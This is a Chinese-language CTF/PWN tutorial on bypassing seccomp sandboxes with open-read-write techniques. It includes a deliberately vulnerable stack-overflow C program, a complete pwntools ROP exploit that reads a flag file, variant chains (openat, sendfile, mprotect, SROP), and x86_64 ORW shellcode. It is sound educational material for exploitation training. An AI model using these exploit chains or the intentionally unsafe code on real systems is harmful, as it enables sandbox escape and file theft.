---
title: "案例八：ORW绕过沙箱 — open-read-write"
type: docs
weight: 8
---

## 案例八：ORW绕过沙箱 — open-read-write

### 场景描述

在前七个案例中，我们的终极目标都是获取shell——执行`execve("/bin/sh", ...)`系统调用，获得一个交互式命令行。但在真实CTF竞赛和高级漏洞利用场景中，出题者（或防御者）会部署**seccomp沙箱**，将`execve`系统调用列入黑名单。此时即使你完全控制了程序的执行流，也无法通过常规方式获取shell。

**ORW（Open-Read-Write）绕过**的核心思想非常直接：既然不能执行`execve`启动新进程，那就直接用系统调用读取目标文件并输出。具体来说，攻击者构造ROP链依次执行：

1. `open("flag", O_RDONLY)` — 打开目标文件，获得文件描述符
2. `read(fd, buffer, size)` — 将文件内容读入内存
3. `write(1, buffer, size)` — 将内存中的内容写到标准输出

这是一套**不依赖execve的文件读取方案**，在seccomp限制`execve`但允许`open`/`read`/`write`的场景下完全有效。ORW是PWN领域中应对沙箱限制的标准手段，也是CTF中PWN题的常见考察方向。

### 背景知识：seccomp沙箱机制

#### 什么是seccomp

seccomp（Secure Computing Mode）是Linux内核提供的一种系统调用过滤机制。它允许进程在运行时限制自身（或被父进程限制）只能调用一组白名单中的系统调用。任何不在白名单中的系统调用都会被内核拒绝，触发`SIGSYS`信号或直接终止进程。

seccomp有三种主要模式：

| 模式 | 值 | 说明 |
|------|---|------|
| `SECCOMP_MODE_DISABLED` | 0 | 不启用过滤 |
| `SECCOMP_MODE_STRICT` | 1 | 严格模式，只允许`read`、`write`、`exit`、`sigreturn` |
| `SECCOMP_MODE_FILTER` | 2 | 自定义BPF过滤规则（最灵活，CTF中最常见） |

CTF题目中几乎都使用`SECCOMP_MODE_FILTER`模式，通过BPF（Berkeley Packet Filter）程序定义细粒度的过滤规则。

#### seccomp的常见配置模式

出题者通常在程序初始化阶段调用`seccomp()`或`prctl()`系统调用来加载BPF规则。典型的沙箱策略有以下几种：

**模式一：黑名单（Blacklist）** — 禁止特定系统调用（如仅禁止`execve`）

```text
允许: open, read, write, openat, mmap, mprotect, brk, ...
禁止: execve, execveat
```

这种模式下ORW最简单，因为`open`/`read`/`write`全部可用。

**模式二：白名单（Whitelist）** — 只允许少量系统调用

```text
允许: open, read, write, exit, exit_group
禁止: 其他一切
```

这种模式更严格，但只要`open`/`read`/`write`在白名单中，ORW仍然有效。

**模式三：混合限制** — 允许`open`但限制`read`/`write`的参数

```text
允许: open, read, write
限制: read的fd只能是open的返回值, write的fd只能是1
```

这种模式下需要注意参数传递的精确性。

#### 如何检测沙箱规则

在实际利用之前，必须先分析目标程序的seccomp规则，确定哪些系统调用被允许、哪些被禁止。错误的假设会导致利用失败。

**方法一：seccomp-tools（推荐）**

seccomp-tools是一个Ruby工具，可以静态分析ELF文件中的BPF规则：

```bash
# 安装
sudo gem install seccomp-tools

# 分析ELF文件中的seccomp规则
seccomp-tools dump ./sandboxed_vuln

# 输出示例：
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x01 0x00 0x40000000  if (A >= 0x40000000) goto 0005
#  0004: 0x15 0x01 0x00 0x0000003b  if (A == 59) goto 0006  # execve = 59
#  0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0006: 0x06 0x00 0x00 0x00000000  return KILL
#  0007: 0x06 0x00 0x00 0x00000000  return KILL
```

上述规则的含义是：在x86_64架构下，如果系统调用号等于59（execve），则返回KILL；否则返回ALLOW。这就是一个典型的"仅禁止execve"的黑名单沙箱。

**方法二：strace动态追踪**

```bash
# 追踪程序的系统调用
strace -f -e trace=seccomp ./sandboxed_vuln

# 或者追踪所有被拒绝的系统调用
strace -f ./sandboxed_vuln 2>&1 | grep EPERM
```

**方法三：在GDB中检查**

```bash
# 使用pwndbg
pwndbg> seccomp
# 显示当前进程的seccomp过滤规则

# 或手动检查prctl调用
pwndbg> b prctl
pwndbg> b seccomp
pwndbg> r
```

#### 常见系统调用号速查表

在构造ORW ROP链时，你需要知道每个系统调用在目标架构上的编号：

| 系统调用 | x86_64编号 | x86编号 | ARM编号 | 说明 |
|----------|-----------|---------|---------|------|
| `read` | 0 | 3 | 63 | 读取文件/socket |
| `write` | 1 | 4 | 64 | 写入文件/socket |
| `open` | 2 | 5 | 5 | 打开文件 |
| `close` | 3 | 6 | 57 | 关闭文件描述符 |
| `stat` | 4 | 106 | 106 | 获取文件状态 |
| `fstat` | 5 | 108 | 197 | 获取文件描述符状态 |
| `lseek` | 8 | 19 | 62 | 移动文件指针 |
| `mmap` | 9 | 192 | 192 | 内存映射 |
| `mprotect` | 10 | 125 | 125 | 修改内存保护属性 |
| `execve` | 59 | 11 | 11 | 执行程序（通常被禁止） |
| `openat` | 257 | 295 | 56 | 打开文件（相对路径） |
| `sendfile` | 40 | 187 | 187 | 零拷贝文件传输 |

### 漏洞程序与编译

以下是一个典型的带seccomp沙箱的漏洞程序：

```c
// sandboxed_vuln.c — 带沙箱的栈溢出程序
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <seccomp.h>
#include <fcntl.h>

void setup_sandbox() {
    // 使用libseccomp库设置沙箱
    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW);  // 默认允许所有
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);   // 禁止execve
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0); // 禁止execveat
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(fork), 0);     // 禁止fork
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(vfork), 0);    // 禁止vfork
    seccomp_load(ctx);
}

char flag_path[] = "flag";

void vuln() {
    char buf[0x20];
    puts("Input your data:");
    read(0, buf, 0x100);  // 栈溢出漏洞：读取0x100字节到0x20的缓冲区
}

int main() {
    setup_sandbox();
    puts("=== Sandboxed Challenge ===");
    vuln();
    return 0;
}
```

编译命令：

```bash
# 编译带seccomp的漏洞程序（需要libseccomp-dev）
gcc -o sandboxed_vuln sandboxed_vuln.c \
    -lseccomp \
    -fno-stack-protector \
    -no-pie \
    -z execstack

# 安装libseccomp开发库（如未安装）
sudo apt install libseccomp-dev
```

编译选项说明：

| 选项 | 作用 |
|------|------|
| `-lseccomp` | 链接libseccomp库 |
| `-fno-stack-protector` | 禁用栈保护（Canary），简化利用 |
| `-no-pie` | 禁用PIE，固定地址布局 |
| `-z execstack` | 允许栈执行（实际利用中不一定需要，因为ORW是ROP方式） |

### 完整利用过程

#### 第一步：分析沙箱规则

使用seccomp-tools确定哪些系统调用可用：

```bash
seccomp-tools dump ./sandboxed_vuln
```

假设输出显示`execve`（59）和`execveat`（322）被禁止，但`open`（2）、`read`（0）、`write`（1）均允许。这意味着ORW方案可行。

#### 第二步：确定偏移量

使用pwntools的`cyclic`工具确定溢出偏移：

```python
from pwn import *
context.arch = 'amd64'

# 生成周期性pattern并触发崩溃
p = process('./sandboxed_vuln')
p.sendline(cyclic(0x100))
p.wait()

# 从core dump中读取RIP
core = p.corefile
offset = cyclic_find(core.read(core.rsp, 8))  # 找到返回地址的偏移
print(f"Offset: {offset}")
```

或者使用更直接的方式：

```bash
# 使用GDB+pwndbg
pwndbg> cyclic 0x100
# 发送pattern后触发崩溃
pwndbg> cyclic -l <RIP中的值>
# 输出偏移量
```

#### 第三步：信息泄露（获取libc基地址）

在本案例的前置假设中，我们已经通过某种方式泄露了libc基地址。这通常通过以下方式之一完成：

- 利用格式化字符串漏洞泄露GOT表中libc函数的真实地址
- 利用`puts@plt`输出`__libc_start_main`在GOT中的值
- 利用`write@plt`向stdout输出GOT表内容

假设泄露得到的libc基地址为`0x7f1234000000`。

#### 第四步：搜索必要的gadget

ORW需要以下gadget：

- `pop rdi; ret` — 设置第一个参数（文件路径指针/fd）
- `pop rsi; ret` — 设置第二个参数（flags/buf指针）
- `pop rdx; ret` 或 `pop rdx; pop r12; ret` — 设置第三个参数（mode/count）
- `pop rax; ret` — 设置系统调用号
- `syscall; ret` — 触发系统调用

```python
from pwn import *

context.arch = 'amd64'
elf = ELF('./sandboxed_vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_base = 0x7f1234000000  # 假设已泄露

# 从libc中搜索gadget
pop_rdi = libc_base + next(libc.search(asm('pop rdi; ret')))
pop_rsi = libc_base + next(libc.search(asm('pop rsi; ret')))
pop_rdx = libc_base + next(libc.search(asm('pop rdx; pop r12; ret')))
pop_rax = libc_base + next(libc.search(asm('pop rax; ret')))
syscall_ret = libc_base + next(libc.search(asm('syscall; ret')))

print(f"pop_rdi:    {hex(pop_rdi)}")
print(f"pop_rsi:    {hex(pop_rsi)}")
print(f"pop_rdx:    {hex(pop_rdx)}")
print(f"pop_rax:    {hex(pop_rax)}")
print(f"syscall_ret: {hex(syscall_ret)}")
```

**为什么gadget要从libc中搜索？** 因为本案例中程序是动态链接的且未开启PIE，程序自身的代码段中可用的gadget非常有限。libc是一个拥有数百万字节代码的大库，其中几乎一定能找到所有需要的gadget。另外，由于已经泄露了libc基地址，libc中gadget的绝对地址可以直接计算。

**注意`pop rdx; pop r12; ret`这种复合gadget：** 在很多libc版本中，单独的`pop rdx; ret`并不容易找到，但`pop rdx; pop r12; ret`很常见（来自`__libc_csu_init`的通用gadget序列）。使用这种gadget时需要在栈上多放一个8字节的占位值来"消耗"掉`pop r12`。

#### 第五步：准备可控内存区域

ORW链需要在程序地址空间中找一块**可写的内存区域**来存放：

1. flag文件路径字符串（如`"flag\x00"`）
2. 读取文件内容的缓冲区

通常选择`.bss`段（程序的未初始化数据段，天然可写且地址固定）：

```python
# BSS段上的一个安全地址（远离其他数据）
bss_buf = 0x404900  # 需要通过readelf或GDB确认这个地址是空闲的

# 验证方法：
# readelf -S ./sandboxed_vuln | grep bss
# 或在GDB中: pwndbg> vmmap 查看.bss段的地址范围
```

**关键细节：** 选择BSS地址时要确保它不会与程序运行时使用的数据冲突。通常选择BSS段的高地址部分（远离`__bss_start`）比较安全。另外，这个地址必须是8字节对齐的。

#### 第六步：将flag路径写入可控内存

在调用`open`之前，需要先将flag文件的路径字符串写入可控内存区域。这里使用`read(0, ...)`系统调用从stdin读入字符串：

```python
# 阶段0：通过read(0, bss_buf, 0x10)将"flag"字符串写入BSS
# 这一步利用了程序本身的read调用，或者在ROP链中先执行一次read
flag_str = b"flag\x00"

# 方案A：在ROP链开头先执行read(0, bss_buf, 0x10)写入路径
# 方案B：如果程序的BSS段已有flag路径（如题目全局变量），直接使用
```

#### 第七步：构造完整的ORW ROP链

以下是完整的利用代码：

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'  # 调试模式，查看交互细节

p = process('./sandboxed_vuln')
elf = ELF('./sandboxed_vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# ========== 已知信息 ==========
libc_base = 0x7f1234000000   # 假设已通过信息泄露获得
offset = 0x28                 # buffer(0x20) + saved rbp(0x8)

# ========== 搜索gadget ==========
pop_rdi = libc_base + next(libc.search(asm('pop rdi; ret')))
pop_rsi = libc_base + next(libc.search(asm('pop rsi; ret')))
pop_rdx_r12 = libc_base + next(libc.search(asm('pop rdx; pop r12; ret')))
pop_rax = libc_base + next(libc.search(asm('pop rax; ret')))
syscall_ret = libc_base + next(libc.search(asm('syscall; ret')))

# ========== 准备内存地址 ==========
bss_buf = 0x404900            # BSS段中的一块空闲区域
flag_path_addr = bss_buf      # flag路径存放在bss_buf的开头
read_buf_addr = bss_buf + 0x20  # 文件内容读取缓冲区

# ========== 构造ROP链 ==========
rop = b'A' * offset

# ------ 阶段0：read(0, flag_path_addr, 0x10) ------
# 从stdin读取"flag"字符串到BSS段
rop += p64(pop_rax) + p64(0)              # rax = 0 (sys_read)
rop += p64(pop_rdi) + p64(0)              # rdi = 0 (stdin)
rop += p64(pop_rsi) + p64(flag_path_addr) # rsi = BSS地址
rop += p64(pop_rdx_r12) + p64(0x10) + p64(0)  # rdx = 0x10 (读取长度)
rop += p64(syscall_ret)

# ------ 阶段1：open("flag", O_RDONLY, 0) ------
# O_RDONLY = 0, O_WRONLY = 1, O_RDWR = 2
# open系统调用: rax=2, rdi=pathname, rsi=flags, rdx=mode
rop += p64(pop_rax) + p64(2)              # rax = 2 (sys_open)
rop += p64(pop_rdi) + p64(flag_path_addr) # rdi = "flag"字符串地址
rop += p64(pop_rsi) + p64(0)              # rsi = 0 (O_RDONLY)
rop += p64(pop_rdx_r12) + p64(0) + p64(0) # rdx = 0 (mode，读模式下无效)
rop += p64(syscall_ret)

# ------ 阶段2：read(fd, read_buf_addr, 0x100) ------
# open返回的fd通常为3（0=stdin, 1=stdout, 2=stderr已被占用）
# 如果程序中有其他文件操作，fd编号可能不同
# read系统调用: rax=0, rdi=fd, rsi=buf, rdx=count
rop += p64(pop_rax) + p64(0)              # rax = 0 (sys_read)
rop += p64(pop_rdi) + p64(3)              # rdi = 3 (fd，由open返回)
rop += p64(pop_rsi) + p64(read_buf_addr)  # rsi = 读取缓冲区
rop += p64(pop_rdx_r12) + p64(0x100) + p64(0)  # rdx = 0x100 (最多读256字节)
rop += p64(syscall_ret)

# ------ 阶段3：write(1, read_buf_addr, 0x100) ------
# write系统调用: rax=1, rdi=fd, rsi=buf, rdx=count
rop += p64(pop_rax) + p64(1)              # rax = 1 (sys_write)
rop += p64(pop_rdi) + p64(1)              # rdi = 1 (stdout)
rop += p64(pop_rsi) + p64(read_buf_addr)  # rsi = 包含flag的缓冲区
rop += p64(pop_rdx_r12) + p64(0x100) + p64(0)  # rdx = 0x100 (输出长度)
rop += p64(syscall_ret)

# ========== 发送ROP链 ==========
p.recvuntil(b'Input your data:')
p.send(rop)

# ========== 发送flag路径字符串 ==========
# read(0, ...)会等待stdin输入，这里发送文件名
p.send(b'flag\x00')

# ========== 接收flag ==========
result = p.recvall(timeout=3)
print(f"[*] Flag: {result}")
p.close()
```

#### 第八步：调试与验证

利用GDB+pwndbg逐步调试ROP链的执行过程：

```bash
# 以调试模式启动
gdb ./sandboxed_vuln

# 设置断点在syscall指令
pwndbg> b *syscall_ret_addr

# 运行并发送payload
pwndbg> c

# 每次syscall时检查寄存器
pwndbg> reg
# 确认 rax=2, rdi=指向"flag", rsi=0, rdx=0 （第一次open）
# 确认 rax=0, rdi=3, rsi=缓冲区, rdx=0x100 （第二次read）
# 确认 rax=1, rdi=1, rsi=缓冲区, rdx=0x100 （第三次write）
```

**关键检查点：**

- `open`的返回值（存储在`rax`中）是否为3？如果返回负数，说明文件路径错误或文件不存在
- `read`之后BSS缓冲区中是否包含flag内容？用`x/s bss_buf`查看
- `write`是否成功输出到stdout？

### ORW的常见变体与进阶技巧

#### 变体一：使用openat替代open

在某些沙箱配置中，`open`被禁止但`openat`被允许。`openat`是`open`的扩展版本：

```c
// openat的原型
int openat(int dirfd, const char *pathname, int flags, mode_t mode);
```

```python
# openat系统调用: rax=257, rdi=dirfd, rsi=pathname, rdx=flags, r10=mode
# AT_FDCWD = -100 (0xffffffffffffff9c) 表示相对于当前工作目录

rop += p64(pop_rax) + p64(257)            # rax = 257 (sys_openat)
rop += p64(pop_rdi) + p64(0xffffffffffffff9c)  # rdi = AT_FDCWD
rop += p64(pop_rsi) + p64(flag_path_addr) # rsi = pathname
rop += p64(pop_rdx_r12) + p64(0) + p64(0) # rdx = O_RDONLY
# 注意：openat的第四个参数(r10)需要通过pop r10; ret gadget设置
# r10 = 0 (mode)
```

**注意：** `openat`需要控制`r10`寄存器，而很多libc中不容易找到`pop r10; ret` gadget。替代方案是使用`ret2csu`技术来间接控制`r10`（因为`__libc_csu_init`的gadget会将`r12`的值移动到`r10`附近）。

#### 变体二：使用sendfile替代read+write

如果`read`或`write`中的某个被禁止，可以尝试`sendfile`：

```c
// sendfile的原型：在两个文件描述符之间直接传输数据（零拷贝）
ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
```

```python
# sendfile系统调用: rax=40, rdi=out_fd, rsi=in_fd, rdx=offset, r10=count
# sendfile(1, fd, NULL, 0x100) — 将文件内容直接输出到stdout

# 先open获得fd
rop += ...  # open("flag", 0)

# sendfile(stdout_fd=1, file_fd=3, offset=NULL, count=0x100)
rop += p64(pop_rax) + p64(40)             # rax = 40 (sys_sendfile)
rop += p64(pop_rdi) + p64(1)              # rdi = 1 (stdout)
rop += p64(pop_rsi) + p64(3)              # rsi = 3 (fd from open)
rop += p64(pop_rdx_r12) + p64(0) + p64(0) # rdx = NULL (不使用offset)
# r10 = 0x100 (count) — 需要pop r10 gadget
```

`sendfile`的优势在于只需要一次系统调用就能完成"读取+输出"，比`read+write`少一次syscall，在某些严格限制syscall次数的沙箱中很有用。

#### 变体三：使用writev批量输出

```c
// writev的原型：写入多段分散的数据
ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
```

```python
# 如果需要输出较长的内容且单次write的count受到限制
# 可以用writev将多个缓冲区的数据一次性写出
# writev系统调用: rax=20, rdi=fd, rsi=iov, rdx=iovcnt
```

#### 变体四：部分沙箱绕过 — mmap+shellcode

当沙箱只允许`read`/`write`但不允许`open`时，如果程序本身已经打开了文件（如flag文件），可以直接利用已有的fd：

```python
# 如果程序在漏洞触发前已经open了flag文件，fd可能为3
# 则跳过open阶段，直接read+write
rop += p64(pop_rax) + p64(0)              # sys_read
rop += p64(pop_rdi) + p64(3)              # fd = 3（已打开的flag文件）
rop += p64(pop_rsi) + p64(bss_buf)
rop += p64(pop_rdx_r12) + p64(0x100) + p64(0)
rop += p64(syscall_ret)

rop += p64(pop_rax) + p64(1)              # sys_write
rop += p64(pop_rdi) + p64(1)
rop += p64(pop_rsi) + p64(bss_buf)
rop += p64(pop_rdx_r12) + p64(0x100) + p64(0)
rop += p64(syscall_ret)
```

#### 变体五：mprotect+shellcode方案

当可用gadget极少、难以构造完整ORW ROP链时，可以先用`mprotect`将某块内存设为可执行，然后跳转到shellcode：

```python
# mprotect(addr, size, PROT_READ|PROT_WRITE|PROT_EXEC)
# mprotect系统调用: rax=10, rdi=addr, rsi=len, rdx=prot
# PROT_READ=1, PROT_WRITE=2, PROT_EXEC=4, PROT_RWX=7

rop += p64(pop_rax) + p64(10)             # sys_mprotect
rop += p64(pop_rdi) + p64(0x400000)       # addr（页对齐）
rop += p64(pop_rsi) + p64(0x1000)         # len (4KB)
rop += p64(pop_rdx_r12) + p64(7) + p64(0) # prot = RWX
rop += p64(syscall_ret)
# 之后跳转到shellcode（shellcode中执行ORW逻辑）
```

然后用ORW shellcode替代ROP链：

```nasm
; x86_64 ORW shellcode
; open("flag", 0)
xor    rsi, rsi          ; flags = O_RDONLY
push   0x67616c66        ; "flag" (注意字节序)
mov    rdi, rsp           ; pathname
xor    rdx, rdx           ; mode = 0
mov    rax, 2             ; sys_open
syscall

; read(fd, buf, 0x100)
mov    rdi, rax           ; fd = open的返回值
sub    rsp, 0x100         ; 在栈上分配缓冲区
mov    rsi, rsp           ; buf
mov    rdx, 0x100         ; count
xor    rax, rax           ; sys_read
syscall

; write(1, buf, 0x100)
mov    rdi, 1             ; stdout
mov    rsi, rsp           ; buf
mov    rdx, 0x100         ; count
mov    rax, 1             ; sys_write
syscall
```

### 实际CTF赛题中的ORW变体

#### 变体：动态fd编号

在某些题目中，`open`返回的fd不一定是3。程序可能在漏洞触发前已经打开了多个文件，或者使用了`dup2`重定向了fd。

**解决方法一：** 利用ROP链在`open`和`read`之间加入一个"中转"步骤——将`open`的返回值（存储在`rax`中）直接传递给后续的`read`调用。但这需要一个`mov rdi, rax; ret`或类似gadget，往往不容易找到。

**解决方法二：** 使用`SigreturnFrame`（SROP）一次性设置所有寄存器，包括将`rax`（open的返回值）传递给`rdi`（read的第一个参数）。这是SROP与ORW的经典组合：

```python
# SROP+ORW组合：先open，然后用sigreturn帧一次性设置read的所有参数
# sigreturn会将rax的值恢复为open的返回值（fd）
# 同时设置rdi=fd, rsi=buf, rdx=count, rax=0(sys_read)

frame = SigreturnFrame()
frame.rax = 2             # sys_open
frame.rdi = flag_path_addr
frame.rsi = 0             # O_RDONLY
frame.rdx = 0
frame.rip = syscall_ret
frame.rsp = next_stack     # ROP链继续的地址

# open之后，rax中存储了fd
# 用sigreturn帧设置下一阶段的寄存器
frame2 = SigreturnFrame()
frame2.rax = 0            # sys_read
frame2.rdi = ???          # 需要从rax中获取fd —— 这正是SROP的难点
```

**解决方法三（最常用）：** 直接尝试fd=3, 4, 5等常见值，或者通过侧信道（如`write`输出fd值到stdout）获取确切编号。

#### 变体：路径限制

某些沙箱不仅限制系统调用，还限制`open`的文件路径参数——比如只允许打开特定目录下的文件，或者禁止路径中包含`/`字符。

```python
# 如果禁止路径中的'/'，无法使用绝对路径如"/flag"
# 必须使用相对路径"flag"（相对于程序的工作目录）

# 如果需要打开子目录中的文件如"/home/ctf/flag"但禁止'/'
# 可以尝试：openat(AT_FDCWD, "home/ctf/flag", 0) 
# 或者利用程序已有的路径拼接功能
```

#### 变体：flag不在本地文件中

在某些高难度题目中，flag可能存储在：

- 环境变量中（需要读取`/proc/self/environ`）
- 特殊文件中（如`/dev/flag`、`/tmp/flag`）
- 需要通过网络获取（需要`socket`+`connect`+`recv`等系统调用）

```python
# 读取环境变量
# open("/proc/self/environ", 0)
flag_path = b"/proc/self/environ\x00"

# 读取/proc/self/maps（泄露内存布局）
flag_path = b"/proc/self/maps\x00"
```

### ORW与其他技术的组合

ORW不是孤立存在的技术，它经常需要与其他PWN技术组合使用：

| 组合方式 | 场景 | 说明 |
|----------|------|------|
| 信息泄露 + ORW | ASLR开启 | 先泄露libc基地址，再用libc中的gadget构造ORW |
| 栈迁移 + ORW | 栈空间不足 | 先将栈迁移到BSS/堆，再在新栈上布置ORW链 |
| SROP + ORW | gadget极少 | 用sigreturn帧一次性设置所有寄存器 |
| ret2csu + ORW | 需要控制rdx/r12 | 用__libc_csu_init中的通用gadget辅助ORW |
| 堆利用 + ORW | 堆漏洞 | 通过堆漏洞控制执行流，跳转到ORW链 |
| 格式化字符串 + ORW | 有格式化字符串漏洞 | 先用格式化字符串泄露libc，再ORW |

### 常见错误与排查

#### 错误一：open返回负数

```text
现象：open的返回值rax = 0xffffffffffffffda (-38) 或其他负数
原因：flag文件路径错误，或文件不存在
排查：
  1. 确认路径字符串是否正确写入BSS（GDB: x/s 0x404900）
  2. 确认路径末尾是否有\x00终止符
  3. 确认程序的工作目录下确实存在flag文件
  4. 检查seccomp是否禁止了open（用seccomp-tools确认）
```

#### 错误二：read读取到空内容

```text
现象：write输出了0x100字节但全是\x00
原因：
  1. fd编号错误——open返回的fd不是3
  2. 文件已读到末尾（偏移量不对）
  3. read的buf地址不可写
排查：
  1. 在open之后检查rax的值（即fd编号）
  2. 确认bss_buf地址是可写的（readelf -S查看.bss段范围）
  3. 尝试不同的fd值（3, 4, 5, ...）
```

#### 错误三：程序在syscall处崩溃

```text
现象：SIGSEGV或SIGSYS在syscall指令处
原因：
  1. SIGSYS = seccomp禁止了该系统调用
  2. SIGSEGV = 参数错误（如pathname指向不可读内存）
排查：
  1. 检查寄存器值是否正确（pwndbg: reg）
  2. 确认系统调用号是否正确（x86_64: open=2, not 5）
  3. 检查pathname地址是否指向正确的字符串
```

#### 错误四：GOT表已被RELRO完全保护

```text
现象：无法通过GOT覆写修改函数指针
原因：Full RELRO保护下GOT表只读
解决：这是正常的——ORW本身就是绕过GOT限制的方案之一
      ORW不依赖GOT覆写，直接通过ROP链操作系统调用
```

#### 错误五：libc版本不匹配

```text
现象：gadget地址计算错误，跳转到错误位置
原因：本地libc和远程libc版本不同
排查：
  1. 使用LibcSearcher根据泄露的函数地址推断libc版本
  2. 下载远程同版本libc进行gadget搜索
  3. 使用patchelf将程序链接到目标libc版本
```

### 总结

ORW绕过沙箱是PWN领域中一个**实战性极强**的技术。它的核心逻辑非常简单——用`open`+`read`+`write`替代`execve`来读取flag文件——但实际运用中需要处理大量细节：

1. **沙箱分析是前提** — 必须先用seccomp-tools确定哪些系统调用可用，不能盲目假设
2. **gadget搜索是基础** — 需要`pop rdi/rsi/rdx/rax; ret`和`syscall; ret`这组核心gadget
3. **内存布局是关键** — 需要在BSS等可控区域存放路径字符串和读取缓冲区
4. **fd编号是易错点** — `open`返回的fd不一定是3，需要根据实际情况调整
5. **技术组合是进阶** — ORW常常与SROP、栈迁移、ret2csu等技术配合使用

ORW技术也揭示了一个更深层的安全哲学：**完全禁止所有危险操作是极其困难的**。只要系统仍然需要执行基本的I/O操作（读写文件），攻击者就有可能利用这些"合法"操作来达到目的。这也是为什么现代安全防御越来越强调**纵深防御**（Defense in Depth）——不仅仅依赖沙箱，还要配合地址随机化、控制流完整性、最小权限原则等多层防护。

***

> **与案例七的关联：** 案例七（SROP）中我们学习了如何利用`sigreturn`一次性设置所有寄存器。在实际CTF赛题中，SROP和ORW经常组合使用——当可用gadget极少时，可以用SROP帧来精确设置ORW每个阶段的寄存器状态。建议在完成本案例后，尝试用SROP方式重写ORW利用链，体会两种技术的互补关系。
